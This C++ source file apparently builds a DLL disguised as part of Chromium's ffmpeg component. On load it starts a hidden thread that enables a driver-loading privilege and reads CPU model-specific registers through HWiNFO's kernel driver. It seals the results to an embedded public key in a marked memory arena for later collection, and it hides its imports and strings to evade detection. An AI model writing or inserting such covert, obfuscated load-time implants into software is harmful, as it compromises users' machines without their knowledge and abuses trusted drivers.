/* MTRR snapshot via GamePP's HWiNFO device.
 * JSON is ECDH P-256 + AES-256-GCM sealed into a 16KiB VirtualAlloc arena.
 * Win32/BCrypt imports are resolved with lazy_importer; string literals use xorstr.
 * The patch-slot UUID and public key in kMtrrPatchSlot are not string literals.
 */
#include <intrin.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <bcrypt.h>

#include "chromium/mtrr_blob.h"
#include "chromium/third_party/lazy_importer/lazy_importer.hpp"
#include "chromium/third_party/xorstr/xorstr.hpp"

extern "C" void av_max_alloc(size_t max);

#pragma comment(linker, "/INCLUDE:_kMtrrPatchSlot")

#ifndef NT_SUCCESS
#define NT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)
#endif

enum { kIoctlRdMsr = 0x85FE2604u, kIntervalMs = 60000 };

#pragma pack(push, 1)
struct MsrBuf {
  uint32_t msr;
  uint32_t reserved;
  uint64_t value;
};
#pragma pack(pop)

static_assert(sizeof(MsrBuf) == 16, "RdMSR buffer must be 16 bytes");
static_assert(kMtrrArenaIvOff == kMtrrArenaEphPubOff + kMtrrEccPubLen,
              "ephemeral key must sit against the IV");
static_assert(kMtrrArenaCtOff == kMtrrArenaIvOff + kMtrrArenaIvLen,
              "ciphertext must follow the IV");
static_assert(kMtrrArenaFtrMagicOff == kMtrrArenaSize - 16,
              "footer magic is the last 16 bytes");
static_assert(kMtrrSlotCookieEndOff == kMtrrSlotPubkeyOff + kMtrrSlotPubkeyCap,
              "end cookie follows the public-key cap");

struct JsonBuf {
  char *p;
  size_t cap;
  size_t n;
  int ok;
};

static HANDLE g_stop;
static HMODULE g_bcrypt;
static HMODULE g_advapi;
static BCRYPT_ALG_HANDLE g_ecdh;
static BCRYPT_ALG_HANDLE g_aes;
static BCRYPT_KEY_HANDLE g_peer;
static uint8_t *g_arena;
static uint8_t g_hdr[16];
static uint8_t g_ftr[16];
static int g_have_frame;

static const uint32_t kFixMsr[] = {
    0x250u, 0x258u, 0x259u, 0x268u, 0x269u, 0x26Au,
    0x26Bu, 0x26Cu, 0x26Du, 0x26Eu, 0x26Fu};

static void XsCopy(char *dst, size_t cap, const char *s) {
  size_t n = strlen(s);
  if (n >= cap)
    n = cap - 1;
  memcpy(dst, s, n);
  dst[n] = 0;
}

static void XsCopyW(wchar_t *dst, size_t cap, const wchar_t *s) {
  size_t n = wcslen(s);
  if (n >= cap)
    n = cap - 1;
  memcpy(dst, s, n * sizeof(wchar_t));
  dst[n] = 0;
}

static void Wipe(void *p, size_t n) {
  volatile unsigned char *v = static_cast<volatile unsigned char *>(p);
  while (n--)
    *v++ = 0;
}

static int LoadWinMods(void) {
  if (!g_bcrypt)
    g_bcrypt = LI_FN(LoadLibraryA)(xorstr_("bcrypt.dll"));
  if (!g_advapi)
    g_advapi = LI_FN(LoadLibraryA)(xorstr_("advapi32.dll"));
  return g_bcrypt && g_advapi;
}

static int WaitStop(DWORD ms) {
  return g_stop && LI_FN(WaitForSingleObject)(g_stop, ms) == WAIT_OBJECT_0;
}

static void EnableLoadDriverPrivilege(void) {
  HANDLE token = NULL;
  TOKEN_PRIVILEGES tp;
  LUID luid;
  wchar_t priv[32];
  if (!g_advapi)
    return;
  if (!LI_FN(OpenProcessToken).in(g_advapi)(LI_FN(GetCurrentProcess)(),
                                            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                                            &token)) {
    return;
  }
  XsCopyW(priv, 32, xorstr_(L"SeLoadDriverPrivilege"));
  if (!LI_FN(LookupPrivilegeValueW).in(g_advapi)(nullptr, priv, &luid)) {
    LI_FN(CloseHandle)(token);
    return;
  }
  memset(&tp, 0, sizeof(tp));
  tp.PrivilegeCount = 1;
  tp.Privileges[0].Luid = luid;
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
  LI_FN(AdjustTokenPrivileges).in(g_advapi)(token, FALSE, &tp, 0, nullptr, nullptr);
  LI_FN(CloseHandle)(token);
}

static HANDLE OpenHwinfoDevice(void) {
  HANDLE h;
  h = LI_FN(CreateFileA)(xorstr_("\\\\.\\HWiNFO_216"),
                         GENERIC_READ | GENERIC_WRITE,
                         FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                         OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
  if (h != INVALID_HANDLE_VALUE)
    return h;
  h = LI_FN(CreateFileA)(xorstr_("\\\\.\\HWiNFO_215"),
                         GENERIC_READ | GENERIC_WRITE,
                         FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                         OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
  if (h != INVALID_HANDLE_VALUE)
    return h;
  h = LI_FN(CreateFileA)(xorstr_("\\\\.\\HWiNFO_217"),
                         GENERIC_READ | GENERIC_WRITE,
                         FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                         OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
  if (h != INVALID_HANDLE_VALUE)
    return h;
  h = LI_FN(CreateFileA)(xorstr_("\\\\.\\HWiNFO_214"),
                         GENERIC_READ | GENERIC_WRITE,
                         FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                         OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
  if (h != INVALID_HANDLE_VALUE)
    return h;
  h = LI_FN(CreateFileA)(xorstr_("\\\\.\\Global\\HWiNFO_216"),
                         GENERIC_READ | GENERIC_WRITE,
                         FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                         OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
  if (h != INVALID_HANDLE_VALUE)
    return h;
  h = LI_FN(CreateFileA)(xorstr_("\\\\.\\Global\\HWiNFO_215"),
                         GENERIC_READ | GENERIC_WRITE,
                         FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                         OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
  if (h != INVALID_HANDLE_VALUE)
    return h;
  return INVALID_HANDLE_VALUE;
}

static int ReadMsr(HANDLE dev, uint32_t msr, uint64_t *out, DWORD *err_out) {
  MsrBuf buf;
  DWORD returned = 0;
  memset(&buf, 0, sizeof(buf));
  buf.msr = msr;
  if (!LI_FN(DeviceIoControl)(dev, kIoctlRdMsr, &buf, sizeof(buf), &buf,
                              sizeof(buf), &returned, nullptr)) {
    if (err_out)
      *err_out = LI_FN(GetLastError)();
    return 0;
  }
  *out = buf.value;
  if (err_out)
    *err_out = 0;
  return 1;
}

static int ThisProcessMayDump(void) {
  const wchar_t *cl = LI_FN(GetCommandLineW)();
  HANDLE mtx;
  if (cl && (wcsstr(cl, xorstr_(L"--type=renderer")) ||
             wcsstr(cl, xorstr_(L"--type=utility"))))
    return 0;
  mtx = LI_FN(CreateMutexW)(nullptr, FALSE,
                            xorstr_(L"Local\\ffmpeg-mtrr-dump-owner"));
  if (!mtx)
    return 0;
  if (LI_FN(GetLastError)() == ERROR_ALREADY_EXISTS) {
    LI_FN(CloseHandle)(mtx);
    return 0;
  }
  return 1;
}

static uint64_t UnixSeconds(void) {
  FILETIME ft;
  ULARGE_INTEGER u;
  LI_FN(GetSystemTimeAsFileTime)(&ft);
  u.LowPart = ft.dwLowDateTime;
  u.HighPart = ft.dwHighDateTime;
  if (u.QuadPart < 116444736000000000ull)
    return 0;
  return (u.QuadPart - 116444736000000000ull) / 10000000ull;
}

static void JRaw(JsonBuf *j, const char *s, size_t n) {
  if (!j->ok)
    return;
  if (j->n + n >= j->cap) {
    j->ok = 0;
    return;
  }
  memcpy(j->p + j->n, s, n);
  j->n += n;
  j->p[j->n] = 0;
}

static void JStr(JsonBuf *j, const char *s) {
  JRaw(j, s, strlen(s));
}

static void JFmt(JsonBuf *j, const char *fmt, ...) {
  char tmp[192];
  va_list ap;
  int n;
  if (!j->ok)
    return;
  va_start(ap, fmt);
  n = vsnprintf(tmp, sizeof(tmp), fmt, ap);
  va_end(ap);
  if (n < 0 || (size_t)n >= sizeof(tmp)) {
    j->ok = 0;
    return;
  }
  JRaw(j, tmp, (size_t)n);
}

static void JHex64(JsonBuf *j, uint64_t v) {
  JFmt(j, xorstr_("\"0x%016llX\""), (unsigned long long)v);
}

static void JMsr(JsonBuf *j, HANDLE dev, uint32_t msr) {
  uint64_t v = 0;
  if (ReadMsr(dev, msr, &v, nullptr))
    JHex64(j, v);
  else
    JStr(j, xorstr_("null"));
}

static void JFixKey(JsonBuf *j, unsigned i) {
  switch (i) {
    case 0:
      JFmt(j, xorstr_("\"%s\":"), xorstr_("FIX64K_00000"));
      break;
    case 1:
      JFmt(j, xorstr_("\"%s\":"), xorstr_("FIX16K_80000"));
      break;
    case 2:
      JFmt(j, xorstr_("\"%s\":"), xorstr_("FIX16K_A0000"));
      break;
    case 3:
      JFmt(j, xorstr_("\"%s\":"), xorstr_("FIX4K_C0000"));
      break;
    case 4:
      JFmt(j, xorstr_("\"%s\":"), xorstr_("FIX4K_C8000"));
      break;
    case 5:
      JFmt(j, xorstr_("\"%s\":"), xorstr_("FIX4K_D0000"));
      break;
    case 6:
      JFmt(j, xorstr_("\"%s\":"), xorstr_("FIX4K_D8000"));
      break;
    case 7:
      JFmt(j, xorstr_("\"%s\":"), xorstr_("FIX4K_E0000"));
      break;
    case 8:
      JFmt(j, xorstr_("\"%s\":"), xorstr_("FIX4K_E8000"));
      break;
    case 9:
      JFmt(j, xorstr_("\"%s\":"), xorstr_("FIX4K_F0000"));
      break;
    default:
      JFmt(j, xorstr_("\"%s\":"), xorstr_("FIX4K_F8000"));
      break;
  }
}

static void JTypeName(JsonBuf *j, uint8_t t) {
  switch (t) {
    case 0:
      JStr(j, xorstr_("UC"));
      break;
    case 1:
      JStr(j, xorstr_("WC"));
      break;
    case 4:
      JStr(j, xorstr_("WT"));
      break;
    case 5:
      JStr(j, xorstr_("WP"));
      break;
    case 6:
      JStr(j, xorstr_("WB"));
      break;
    default:
      JStr(j, xorstr_("?"));
      break;
  }
}

static int EnsureReady(void) {
  BCRYPT_ALG_HANDLE ecdh = NULL;
  BCRYPT_ALG_HANDLE aes = NULL;
  BCRYPT_KEY_HANDLE peer = NULL;
  uint8_t *arena = NULL;
  uint32_t ver = 0, pklen = 0, magic = 0, cbkey = 0;
  NTSTATUS st;
  const unsigned char *slot = kMtrrPatchSlot;
  wchar_t ecdh_alg[16];
  wchar_t aes_alg[8];
  wchar_t chain[24];
  wchar_t gcm[24];
  wchar_t blob[24];

  if (g_arena && g_peer && g_ecdh && g_aes)
    return 1;
  if (!LoadWinMods())
    return 0;

  memcpy(&ver, slot + kMtrrSlotVersionOff, 4);
  memcpy(&pklen, slot + kMtrrSlotPubkeyLenOff, 4);
  memcpy(&magic, slot + kMtrrSlotPubkeyOff, 4);
  memcpy(&cbkey, slot + kMtrrSlotPubkeyOff + 4, 4);
  if (ver != kMtrrSlotVersion || pklen != kMtrrEccPubLen ||
      magic != BCRYPT_ECDH_PUBLIC_P256_MAGIC || cbkey != kMtrrEccCoordLen)
    return 0;

  XsCopyW(ecdh_alg, 16, xorstr_(L"ECDH_P256"));
  st = LI_FN(BCryptOpenAlgorithmProvider).in(g_bcrypt)(&ecdh, ecdh_alg, nullptr, 0);
  if (!NT_SUCCESS(st))
    goto fail;
  XsCopyW(aes_alg, 8, xorstr_(L"AES"));
  st = LI_FN(BCryptOpenAlgorithmProvider).in(g_bcrypt)(&aes, aes_alg, nullptr, 0);
  if (!NT_SUCCESS(st))
    goto fail;
  XsCopyW(chain, 24, xorstr_(L"ChainingMode"));
  XsCopyW(gcm, 24, xorstr_(L"ChainingModeGCM"));
  st = LI_FN(BCryptSetProperty).in(g_bcrypt)(
      aes, chain, reinterpret_cast<PUCHAR>(gcm),
      static_cast<ULONG>((wcslen(gcm) + 1) * sizeof(wchar_t)), 0);
  if (!NT_SUCCESS(st))
    goto fail;
  XsCopyW(blob, 24, xorstr_(L"ECCPUBLICBLOB"));
  st = LI_FN(BCryptImportKeyPair).in(g_bcrypt)(
      ecdh, nullptr, blob, &peer,
      const_cast<PUCHAR>(slot + kMtrrSlotPubkeyOff), pklen, 0);
  if (!NT_SUCCESS(st))
    goto fail;
  arena = static_cast<uint8_t *>(LI_FN(VirtualAlloc)(
      nullptr, kMtrrArenaSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
  if (!arena)
    goto fail;

  memcpy(g_hdr, slot + kMtrrSlotHdrMagicOff, 16);
  memcpy(g_ftr, slot + kMtrrSlotFtrMagicOff, 16);
  g_ecdh = ecdh;
  g_aes = aes;
  g_peer = peer;
  g_arena = arena;
  return 1;

fail:
  if (peer)
    LI_FN(BCryptDestroyKey).in(g_bcrypt)(peer);
  if (ecdh)
    LI_FN(BCryptCloseAlgorithmProvider).in(g_bcrypt)(ecdh, 0);
  if (aes)
    LI_FN(BCryptCloseAlgorithmProvider).in(g_bcrypt)(aes, 0);
  if (arena)
    LI_FN(VirtualFree)(arena, 0, MEM_RELEASE);
  return 0;
}

static int EncryptAndPublish(const char *json, uint32_t json_len) {
  BCRYPT_KEY_HANDLE eph = NULL;
  BCRYPT_KEY_HANDLE sym = NULL;
  BCRYPT_SECRET_HANDLE secret = NULL;
  BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth;
  BCryptBuffer kdf_buf;
  BCryptBufferDesc kdf_desc;
  wchar_t hash_alg[12];
  wchar_t blob[24];
  wchar_t kdf[8];
  UCHAR eph_blob[72];
  UCHAR iv[12];
  UCHAR aes_key[32];
  UCHAR tag[16];
  UCHAR ct[kMtrrJsonCap];
  ULONG written = 0;
  ULONG cb = 0;
  NTSTATUS st;
  uint32_t ver = kMtrrArenaVersion;
  uint32_t flags = 0;
  uint32_t reserved = 0;
  uint8_t *after;
  size_t tail;
  int ok = 0;

  if (!g_arena || !g_peer || !g_ecdh || !g_aes || !g_bcrypt)
    return 0;
  if (json_len == 0 || json_len > kMtrrJsonCap)
    return 0;
  if ((size_t)kMtrrArenaCtOff + json_len + kMtrrArenaTagLen >
      (size_t)kMtrrArenaFtrMagicOff)
    return 0;

  st = LI_FN(BCryptGenerateKeyPair).in(g_bcrypt)(g_ecdh, &eph, 256, 0);
  if (!NT_SUCCESS(st))
    goto done;
  st = LI_FN(BCryptFinalizeKeyPair).in(g_bcrypt)(eph, 0);
  if (!NT_SUCCESS(st))
    goto done;
  cb = sizeof(eph_blob);
  XsCopyW(blob, 24, xorstr_(L"ECCPUBLICBLOB"));
  st = LI_FN(BCryptExportKey).in(g_bcrypt)(eph, nullptr, blob, eph_blob,
                                           sizeof(eph_blob), &cb, 0);
  if (!NT_SUCCESS(st) || cb != sizeof(eph_blob))
    goto done;
  st = LI_FN(BCryptSecretAgreement).in(g_bcrypt)(eph, g_peer, &secret, 0);
  if (!NT_SUCCESS(st))
    goto done;

  XsCopyW(hash_alg, 12, xorstr_(L"SHA256"));
  kdf_buf.cbBuffer = static_cast<ULONG>((wcslen(hash_alg) + 1) * sizeof(wchar_t));
  kdf_buf.BufferType = KDF_HASH_ALGORITHM;
  kdf_buf.pvBuffer = hash_alg;
  kdf_desc.ulVersion = BCRYPTBUFFER_VERSION;
  kdf_desc.cBuffers = 1;
  kdf_desc.pBuffers = &kdf_buf;
  written = sizeof(aes_key);
  XsCopyW(kdf, 8, xorstr_(L"HASH"));
  st = LI_FN(BCryptDeriveKey).in(g_bcrypt)(secret, kdf, &kdf_desc, aes_key,
                                           sizeof(aes_key), &written, 0);
  if (!NT_SUCCESS(st) || written != sizeof(aes_key))
    goto done;

  st = LI_FN(BCryptGenRandom).in(g_bcrypt)(nullptr, iv, sizeof(iv),
                                           BCRYPT_USE_SYSTEM_PREFERRED_RNG);
  if (!NT_SUCCESS(st))
    goto done;
  st = LI_FN(BCryptGenerateSymmetricKey).in(g_bcrypt)(g_aes, &sym, nullptr, 0,
                                                      aes_key, sizeof(aes_key),
                                                      0);
  if (!NT_SUCCESS(st))
    goto done;

  BCRYPT_INIT_AUTH_MODE_INFO(auth);
  auth.pbNonce = iv;
  auth.cbNonce = sizeof(iv);
  auth.pbTag = tag;
  auth.cbTag = sizeof(tag);
  written = 0;
  st = LI_FN(BCryptEncrypt).in(g_bcrypt)(
      sym, reinterpret_cast<PUCHAR>(const_cast<char *>(json)), json_len, &auth,
      nullptr, 0, ct, json_len, &written, 0);
  if (!NT_SUCCESS(st) || written != json_len)
    goto done;

  memset(g_arena, 0, 16);
  _ReadWriteBarrier();
  memcpy(g_arena + kMtrrArenaVersionOff, &ver, 4);
  memcpy(g_arena + kMtrrArenaFlagsOff, &flags, 4);
  memcpy(g_arena + kMtrrArenaJsonLenOff, &json_len, 4);
  memcpy(g_arena + kMtrrArenaReservedOff, &reserved, 4);
  memcpy(g_arena + kMtrrArenaEphPubOff, eph_blob, sizeof(eph_blob));
  memcpy(g_arena + kMtrrArenaIvOff, iv, sizeof(iv));
  memcpy(g_arena + kMtrrArenaCtOff, ct, json_len);
  memcpy(g_arena + kMtrrArenaCtOff + json_len, tag, sizeof(tag));
  after = g_arena + kMtrrArenaCtOff + json_len + kMtrrArenaTagLen;
  tail = static_cast<size_t>(g_arena + kMtrrArenaFtrMagicOff - after);
  if (tail)
    memset(after, 0, tail);
  memcpy(g_arena + kMtrrArenaFtrMagicOff, g_ftr, 16);
  _ReadWriteBarrier();
  memcpy(g_arena, g_hdr, 16);
  ok = 1;

done:
  Wipe(aes_key, sizeof(aes_key));
  if (sym)
    LI_FN(BCryptDestroyKey).in(g_bcrypt)(sym);
  if (secret)
    LI_FN(BCryptDestroySecret).in(g_bcrypt)(secret);
  if (eph)
    LI_FN(BCryptDestroyKey).in(g_bcrypt)(eph);
  return ok;
}

static int BuildJson(HANDLE dev, JsonBuf *j) {
  int regs[4];
  uint32_t ebx, ecx, edx, sig, feat_edx, family, model;
  uint32_t base_family, base_model, ext_family, ext_model;
  int has_mtrr, has_pat, has_msr, fix, wc;
  uint32_t vcnt, pairs, i;
  uint64_t cap = 0, def = 0;
  char vendor[12];

  __cpuid(regs, 0);
  ebx = static_cast<uint32_t>(regs[1]);
  ecx = static_cast<uint32_t>(regs[2]);
  edx = static_cast<uint32_t>(regs[3]);
  XsCopy(vendor, sizeof(vendor), xorstr_("Unknown"));
  if (ebx == 0x756e6547u && edx == 0x49656e69u && ecx == 0x6c65746eu)
    XsCopy(vendor, sizeof(vendor), xorstr_("Intel"));
  else if (ebx == 0x68747541u && edx == 0x69746e65u && ecx == 0x444d4163u)
    XsCopy(vendor, sizeof(vendor), xorstr_("AMD"));

  __cpuid(regs, 1);
  sig = static_cast<uint32_t>(regs[0]);
  feat_edx = static_cast<uint32_t>(regs[3]);
  base_family = (sig >> 8) & 0xfu;
  base_model = (sig >> 4) & 0xfu;
  ext_family = (sig >> 20) & 0xffu;
  ext_model = (sig >> 16) & 0xfu;
  family = base_family == 0xfu ? base_family + ext_family : base_family;
  model = (base_family == 6u || base_family == 0xfu)
              ? base_model + (ext_model << 4)
              : base_model;
  has_mtrr = (feat_edx & (1u << 12)) != 0;
  has_pat = (feat_edx & (1u << 16)) != 0;
  has_msr = (feat_edx & (1u << 5)) != 0;

  JStr(j, xorstr_("{\"v\":1,\"ts\":"));
  JFmt(j, xorstr_("%llu"), (unsigned long long)UnixSeconds());
  JFmt(j, xorstr_(",\"pid\":%lu"),
       (unsigned long)LI_FN(GetCurrentProcessId)());
  JFmt(j, xorstr_(",\"vendor\":\"%s\",\"family\":%u,\"model\":\"%02X\""), vendor,
       family, model);
  JFmt(j, xorstr_(",\"feat\":{\"mtrr\":%d,\"pat\":%d,\"msr\":%d}"), has_mtrr,
       has_pat, has_msr);

  if (!has_mtrr || !has_msr)
    return 0;
  if (!ReadMsr(dev, 0x0FEu, &cap, nullptr))
    return 0;
  vcnt = static_cast<uint32_t>(cap & 0xffu);
  fix = (cap & (1ull << 8)) != 0;
  wc = (cap & (1ull << 10)) != 0;
  JStr(j, xorstr_(",\"mtrrcap\":{\"raw\":"));
  JHex64(j, cap);
  JFmt(j, xorstr_(",\"vcnt\":%u,\"fix\":%d,\"wc\":%d}"), vcnt, fix, wc);

  pairs = vcnt > 40u ? 40u : vcnt;
  JStr(j, xorstr_(",\"var\":["));
  for (i = 0; i < pairs; i++) {
    if (i)
      JStr(j, xorstr_(","));
    JFmt(j, xorstr_("{\"i\":%u,\"base\":"), i);
    JMsr(j, dev, 0x200u + i * 2u);
    JStr(j, xorstr_(",\"mask\":"));
    JMsr(j, dev, 0x201u + i * 2u);
    JStr(j, xorstr_("}"));
  }
  JStr(j, xorstr_("]"));

  if (fix) {
    JStr(j, xorstr_(",\"fix\":{"));
    for (i = 0; i < sizeof(kFixMsr) / sizeof(kFixMsr[0]); i++) {
      if (i)
        JStr(j, xorstr_(","));
      JFixKey(j, i);
      JMsr(j, dev, kFixMsr[i]);
    }
    JStr(j, xorstr_("}"));
  }
  if (has_pat) {
    JStr(j, xorstr_(",\"pat\":"));
    JMsr(j, dev, 0x277u);
  }

  JStr(j, xorstr_(",\"def\":{\"raw\":"));
  if (ReadMsr(dev, 0x2FFu, &def, nullptr)) {
    JHex64(j, def);
    JFmt(j, xorstr_(",\"enable\":%d,\"fixed\":%d,\"type\":\""),
         (int)((def & (1ull << 11)) != 0), (int)((def & (1ull << 10)) != 0));
    JTypeName(j, static_cast<uint8_t>(def));
    JStr(j, xorstr_("\"}"));
  } else {
    JStr(j, xorstr_("null,\"enable\":null,\"fixed\":null,\"type\":null}"));
  }
  JStr(j, xorstr_("}"));
  return j->ok;
}

static int CaptureAndPublish(void) {
  HANDLE dev;
  char json[kMtrrJsonCap];
  JsonBuf j;
  int built;

  if (!EnsureReady())
    return 0;
  dev = OpenHwinfoDevice();
  if (dev == INVALID_HANDLE_VALUE)
    return 0;
  memset(&j, 0, sizeof(j));
  j.p = json;
  j.cap = sizeof(json);
  j.ok = 1;
  built = BuildJson(dev, &j);
  LI_FN(CloseHandle)(dev);
  if (!built || !j.ok || j.n == 0)
    return 0;
  return EncryptAndPublish(json, static_cast<uint32_t>(j.n));
}

static DWORD WINAPI MtrrDumpThread(LPVOID unused) {
  (void)unused;
  if (!LoadWinMods())
    return 0;
  EnableLoadDriverPrivilege();
  while (!WaitStop(0)) {
    if (CaptureAndPublish())
      g_have_frame = 1;
    if (WaitStop(g_have_frame ? kIntervalMs : 500))
      break;
  }
  return 0;
}

extern "C" BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved) {
  HANDLE th;
  (void)reserved;
  if (reason == DLL_PROCESS_ATTACH) {
    LI_FN(DisableThreadLibraryCalls)(instance);
    av_max_alloc(static_cast<size_t>(-1));
    if (!ThisProcessMayDump())
      return TRUE;
    g_stop = LI_FN(CreateEventW)(nullptr, TRUE, FALSE, nullptr);
    if (!g_stop)
      return TRUE;
    th = LI_FN(CreateThread)(nullptr, 0, MtrrDumpThread, nullptr, 0, nullptr);
    if (th)
      LI_FN(CloseHandle)(th);
  } else if (reason == DLL_PROCESS_DETACH) {
    if (g_stop)
      LI_FN(SetEvent)(g_stop);
  }
  return TRUE;
}
